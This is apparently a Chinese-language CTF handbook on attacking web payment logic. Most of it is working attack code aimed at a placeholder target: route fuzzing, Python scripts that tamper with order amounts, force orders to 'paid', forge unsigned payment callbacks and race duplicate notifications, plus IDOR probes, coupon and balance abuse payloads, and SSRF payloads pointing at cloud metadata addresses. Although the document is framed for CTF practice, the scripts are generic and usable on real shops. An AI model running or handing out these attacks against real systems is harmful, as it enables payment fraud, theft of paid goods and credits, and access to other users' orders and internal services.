# Payment Logic Attacks — 支付类 Web CTF 技术手册

> 适用：商品/套餐/充值/订阅/成品账号/AI 额度/积分兑换/虚拟权益类题目。目标不是”猜页面文案”，而是证明订单、金额、状态、回调、签名、幂等、权益发放的信任边界。
>
> **📂 关联技术文件**:
> - [payment-bypass.md](payment-bypass.md) — 支付绕过高阶技术 (参数篡改、Type Confusion、精度攻击、状态机、Mass Assignment、GraphQL、隐藏端点)
> - [payment-callback-async.md](payment-callback-async.md) — 回调与异步攻击深度手册 (签名绕过、回调伪造、Webhook SSRF、幂等重放、MQ攻击、时序竞态、CQRS、DNS Rebinding)
> - [payment-php.md](payment-php.md) — PHP 支付专项攻击 (Type Juggling、strcmp/md5数组绕过、Laravel Cashier、ThinkPHP、WooCommerce、反序列化Gadget、Session攻击)
> - [payment-subscription.md](payment-subscription.md) — 订阅/定期付款攻击 (试用滥用、按比例计费、续费操纵、计量绕过、Seat管理)
> - [payment-digital-goods.md](payment-digital-goods.md) — 虚拟商品/IAP 攻击 (iOS receipt 绕过、Google Play 验证、卡密系统、虚拟货币、License Key)

## 0. 开局资产模型

支付类题先建 6 张表（即使没有源码，也用黑盒请求还原）：

| 模型 | 关键字段 | 典型接口 |
|---|---|---|
| Product / Plan | `product_id`, `sku`, `plan_id`, `price`, `stock`, `duration`, `quota` | `/products`, `/plans`, `/api/plans` |
| Cart / Order | `order_id`, `out_trade_no`, `amount`, `quantity`, `currency`, `user_id`, `status` | `/order/create`, `/checkout`, `/api/orders` |
| Pay Intent | `pay_id`, `channel`, `qr_url`, `pay_url`, `return_url`, `notify_url`, `sign` | `/pay`, `/payment/create`, `/pay/prepay` |
| Notify / Callback | `trade_status`, `paid_at`, `transaction_id`, `signature`, `raw_body` | `/notify`, `/callback`, `/webhook`, `/pay/success` |
| Entitlement | `vip`, `subscription_until`, `credits`, `tokens`, `download_key`, `account_id` | `/me`, `/orders/:id/deliver`, `/api/user` |
| Refund / Cancel | `refund_id`, `refund_amount`, `reason`, `status` | `/refund`, `/order/cancel` |

### 首轮黑盒记录模板

```md
## Payment Surface

- Login required:
- Products/plans:
- Order create request:
- Order state fields:
- Payment channel:
- Callback/notify endpoints:
- Client-controlled fields:
- Server-calculated fields:
- Entitlement effect:
- Rate limit / idempotency:
```

## 1. 路由与参数发现

### 1.1 支付路由字典

优先 fuzz 这些词，保留 `200/3xx/401/403/405/500`：

```text
pay
payment
payments
checkout
order
orders
trade
transaction
transactions
invoice
invoices
cart
goods
product
products
plan
plans
subscribe
subscription
vip
member
membership
credit
credits
balance
wallet
recharge
topup
coupon
discount
promo
promo-code
redeem
notify
callback
webhook
return
success
paid
deliver
fulfill
refund
cancel
```

PowerShell/ffuf：

```powershell
$base='https://target/'
$out='.\exports\ctf-website\<case>\recon\ffuf_payment.json'
@'
pay
payment
payments
checkout
order
orders
trade
transaction
transactions
invoice
invoices
cart
goods
product
products
plan
plans
subscribe
subscription
vip
member
membership
credit
credits
balance
wallet
recharge
topup
coupon
discount
promo
redeem
notify
callback
webhook
return
success
paid
deliver
fulfill
refund
cancel
'@ | Set-Content .\exports\ctf-website\<case>\recon\payment_words.txt
ffuf -u "$base/FUZZ" -w .\exports\ctf-website\<case>\recon\payment_words.txt -mc all -fc 404 -of json -o $out
```

### 1.2 前端静态提取

抓 JS 中的支付关键词：

```powershell
rg -n "pay|payment|order|checkout|trade|notify|callback|webhook|sign|amount|price|sku|plan|vip|credit|coupon|refund|deliver" `
  .\exports\ctf-website\<case> -S
```

## 2. 金额与商品参数篡改

### 2.1 客户端金额不可信

对 order/create 的所有字段做一维变异：

| 字段 | 变异 | 观察 |
|---|---|---|
| `amount`, `price`, `total`, `money` | `0`, `0.01`, `-1`, `1e-9`, `NaN`, `Infinity`, `999999999999`, `"1"` | 订单金额/支付金额/权益是否变化 |
| `quantity`, `count`, `num` | `0`, `-1`, `2`, `999999`, `1.5` | 总价是否错算、库存是否负数 |
| `product_id`, `sku`, `plan_id` | 低价 SKU + 高价权益字段 | 商品/权益错配 |
| `currency`, `unit` | `CNY`, `USD`, `cent`, `yuan` | 分/元单位分歧 |
| `discount`, `coupon`, `coupon_id` | 空/重复/他人/负值 | 折扣叠加 |

Python 最小探针：

```python
import copy, json, time, requests

BASE = "https://target"
S = requests.Session()
S.headers.update({"User-Agent": "ReverseLab-PaymentProbe/1.0"})

def post_json(path, obj):
    r = S.post(BASE + path, json=obj, timeout=15)
    print(path, r.status_code, len(r.content), r.text[:300])
    return r

baseline = {"product_id": 1, "quantity": 1}
mutations = {
    "amount": [0, 0.01, -1, "0.01", "1e-9", 999999999999],
    "price": [0, -1, 1],
    "quantity": [0, -1, 2, 999999, 1.5],
    "plan_id": [1, 2, 999],
    "coupon_id": ["", 0, 1, -1, "FREE", "admin"],
}

for k, vals in mutations.items():
    for v in vals:
        data = copy.deepcopy(baseline)
        data[k] = v
        r = post_json("/api/order/create", data)
        time.sleep(0.2)
```

**漏洞确认标准**：服务端生成订单的 `amount/pay_amount/plan/entitlement` 与真实商品价格不一致，且支付或发货状态可继续推进。

## 3. 支付状态机绕过

### 3.1 常见错误状态流

安全状态流：

```mermaid
stateDiagram-v2
  [*] --> pending: create order
  pending --> paid: verified provider notify
  paid --> delivered: server-side fulfillment
  pending --> cancelled: timeout/user cancel
  paid --> refunded: verified refund
```

危险流：

- `GET /pay/success?order_id=...` 直接把订单改成 paid。
- `POST /order/update` 接受 `status=paid`。
- `return_url` 客户端跳转被当作支付成功依据。
- `notify` 不校验签名/金额/订单归属。
- `delivered` 接口只检查订单存在，不检查 paid。

### 3.2 状态字段探针

```python
import requests

BASE = "https://target"
S = requests.Session()

def try_status(order_id):
    paths = [
        f"/pay/success?order_id={order_id}",
        f"/payment/success?order_id={order_id}",
        f"/order/{order_id}/success",
        f"/order/{order_id}/paid",
        f"/api/order/{order_id}/pay",
        f"/api/order/{order_id}/deliver",
    ]
    bodies = [
        {"order_id": order_id, "status": "paid"},
        {"order_id": order_id, "paid": True},
        {"order_id": order_id, "trade_status": "TRADE_SUCCESS"},
        {"order_id": order_id, "payment_status": "success"},
    ]
    for p in paths:
        for method in ("GET", "POST"):
            r = S.request(method, BASE + p, json=bodies[0] if method == "POST" else None, timeout=15, allow_redirects=False)
            print(method, p, r.status_code, r.headers.get("Location"), r.text[:160])
    for b in bodies:
        for p in ["/api/order/update", "/api/payment/notify", "/notify", "/callback"]:
            r = S.post(BASE + p, json=b, timeout=15, allow_redirects=False)
            print("POST", p, b, r.status_code, r.text[:160])
```

## 4. 回调/通知签名绕过

### 4.1 必须校验的字段

支付回调不能只看 `order_id` 和 `status`，至少要校验：

- Provider 签名：`sign`, `signature`, `X-Signature`, `Wechatpay-Signature`, `Stripe-Signature`
- `out_trade_no/order_id` 与本地订单绑定
- `total_amount/amount` 与本地订单金额一致
- `seller_id/app_id/mch_id` 与配置一致
- `trade_status` 只允许成功终态
- 回调幂等：同一 `transaction_id` 只能处理一次

### 4.2 签名绕过字典

```text
sign=
sign=invalid
sign=0
sign=null
sign[]=x
signature=
signature=undefined
X-Signature: 
X-Signature: invalid
Content-Type: application/x-www-form-urlencoded
Content-Type: application/json
```

### 4.3 回调伪造探针

```python
import requests, itertools, time

BASE = "https://target"
S = requests.Session()

notify_paths = ["/notify", "/callback", "/payment/notify", "/api/payment/notify", "/webhook/pay"]
payloads = [
    {"out_trade_no": "ORDER_ID", "order_id": "ORDER_ID", "trade_status": "TRADE_SUCCESS", "total_amount": "0.01", "sign": ""},
    {"out_trade_no": "ORDER_ID", "status": "success", "amount": "0.01", "signature": "invalid"},
    {"order_id": "ORDER_ID", "paid": True, "transaction_id": "replay-001"},
]
headers = [
    {"Content-Type": "application/json"},
    {"Content-Type": "application/x-www-form-urlencoded"},
    {"X-Signature": ""},
    {"X-Signature": "invalid"},
]

for path, body, hdr in itertools.product(notify_paths, payloads, headers):
    r = S.post(BASE + path, json=body if "json" in hdr.get("Content-Type", "") else None,
               data=body if "form" in hdr.get("Content-Type", "") else None,
               headers=hdr, timeout=15, allow_redirects=False)
    print(path, hdr, r.status_code, len(r.content), r.text[:200])
    time.sleep(0.1)
```

**确认标准**：伪造回调后订单从 pending 变 paid，或权益/余额/订阅增加。

## 5. 幂等与并发

支付类最常见 flag 路径：重复处理同一事件。

| 场景 | 漏洞 | 结果 |
|---|---|---|
| 重复 notify | 缺 transaction/order 幂等锁 | 重复发放权益 |
| 支付成功 + 取消/退款竞态 | 状态机无事务 | paid 仍退款或退款后仍发货 |
| 修改订单金额 + 支付 | create/pay 分离 | 低价支付高价商品 |
| 并发优惠券 | 缺唯一约束 | 折扣重复叠加 |
| 并发领取账号/卡密 | 库存扣减非原子 | 一份库存多人拿 |

并发骨架：

```python
import concurrent.futures, requests, time

BASE = "https://target"
S = requests.Session()

def hit(i):
    r = S.post(BASE + "/api/payment/notify",
               json={"order_id": "ORDER_ID", "status": "success", "transaction_id": "same-tx"},
               timeout=20)
    return i, r.status_code, len(r.content), r.text[:120]

with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
    futs = [ex.submit(hit, i) for i in range(60)]
    for f in concurrent.futures.as_completed(futs):
        print(f.result())
```

验证时必须比较：

1. 并发前订单/余额/权益。
2. 并发响应状态。
3. 并发后订单/余额/权益。
4. 是否生成 flag/卡密/订阅。

## 6. 订单 IDOR / 越权支付

### 6.1 攻击面

- 查看他人订单：`GET /orders/{id}`
- 支付他人订单：`POST /orders/{id}/pay`
- 取消/退款他人订单：`POST /orders/{id}/refund`
- 领取他人权益：`GET /orders/{id}/deliver`
- 用自己支付回调绑定他人 `order_id`

### 6.2 双账号矩阵

支付题最好准备两个普通账号：

| 操作 | A 订单 | B session | 预期 |
|---|---|---|---|
| B GET A order | A `order_id` | B cookie | 403/404 |
| B pay A order | A `order_id` | B cookie | 403/404 |
| B deliver A order | A `order_id` | B cookie | 403/404 |
| notify A order with B amount | A order + fake tx | no/any cookie | reject |

IDOR 探针：

```python
import requests

BASE = "https://target"
A = requests.Session()
B = requests.Session()

order_id = "A_ORDER_ID"
for path in [
    f"/api/orders/{order_id}",
    f"/api/orders/{order_id}/pay",
    f"/api/orders/{order_id}/deliver",
    f"/api/orders/{order_id}/refund",
]:
    for sname, sess in [("A", A), ("B", B)]:
        for method in ("GET", "POST"):
            r = sess.request(method, BASE + path, timeout=15, allow_redirects=False)
            print(sname, method, path, r.status_code, len(r.content), r.text[:120])
```

## 7. 优惠券 / 余额 / 积分组合

组合优先级：

1. `coupon_id` 与 `product_id` 不绑定。
2. 优惠金额可超过订单金额。
3. 优惠券重复使用/并发使用。
4. 余额支付时 `amount=0` 仍发货。
5. 退款返还余额但不撤销权益。

Payload：

```json
{"coupon_id": "FREE"}
{"coupon_id": -1}
{"coupon_id": [1,1,1]}
{"discount": 999999}
{"balance": -100}
{"use_balance": true, "pay_amount": 0}
```

## 8. 回调 URL / SSRF / Open Redirect

支付系统常有 `return_url`, `notify_url`, `redirect_url`, `success_url`：

| 参数 | 风险 |
|---|---|
| `return_url` | open redirect / OAuth token leak |
| `notify_url` | server-side SSRF / internal callback |
| `callback` | JSONP / XSS |
| `webhook` | 内网探测 / metadata SSRF |

最小测试：

```text
return_url=https://example.com
return_url=//example.com
notify_url=http://127.0.0.1:80/
notify_url=http://169.254.169.254/latest/meta-data/
notify_url=http://[::1]/
```

如果服务端会访问 `notify_url`，用可控回连服务记录 DNS/HTTP；CTF 本地可用自建 requestbin/临时 VPS。

## 9. 支付 SDK / CVE 联动

识别信号：

- 前端 JS：`stripe`, `paypal`, `wechatpay`, `alipay`, `payjs`, `yungouos`, `epay`, `xorpay`, `afdian`, `paymongo`
- 后端 header/cookie：`Laravel`, `Django`, `Next.js`, `Nuxt`, `Express`, `Spring`
- API 文档：`/swagger`, `/openapi.json`, `/api-docs`
- 支付库版本：`package-lock.json`, sourcemap, chunk 文件名

流程：

```powershell
# 1. 写 fingerprints.json
@'
[
  {"product":"<framework-or-sdk>", "version":"<version>", "source":"<url/header/js>"}
]
'@ | Set-Content .\cases\<case>\fingerprints.json

# 2. 跑 CVE pipeline
python .\scripts\ctf-website\fingerprint_cve_pipeline.py `
  --fingerprints .\cases\<case>\fingerprints.json `
  --out .\reports\ctf-website\<case>\fingerprint-cve
```

## 10. 证据与复现交付标准

一个支付漏洞只有满足以下任一项才算确认：

- 低价/零价订单获得高价权益。
- 未支付订单变为 paid/delivered。
- 伪造回调通过并发/签名绕过触发发货。
- 他人订单/权益被越权查看或领取。
- 余额/积分/优惠券出现非预期增加。
- RCE/SSRF/CVE 链获得服务器侧可验证输出。
- 页面/接口返回有效 flag。

复现包必须包含：

1. `config`：base URL、cookie/token、order_id/product_id。
2. `payload`：请求体、签名字段、并发参数。
3. `send/receive`：完整 HTTP 发送与响应摘要。
4. `verify`：漏洞前后状态 diff。
5. `flag extraction`：自动 regex `flag{}`, `CTF{}`, `DASCTF{}`。

## 攻击链

```mermaid
flowchart TD
  Recon["路由/JS/网络抓包"] --> Model["还原 Product/Order/Pay/Notify/Entitlement"]
  Model --> Amount["金额/商品参数篡改"]
  Model --> State["状态机绕过"]
  Model --> Notify["伪造支付回调/签名绕过"]
  Model --> Race["并发/幂等"]
  Model --> IDOR["订单 IDOR"]
  Model --> Coupon["优惠/余额组合"]
  Model --> URL["notify_url/return_url SSRF"]
  Amount --> Flag["低价/零价权益或 flag"]
  State --> Flag
  Notify --> Flag
  Race --> Flag
  IDOR --> Flag
  Coupon --> Flag
  URL --> SSRF["SSRF/CVE/RCE"] --> Flag
```

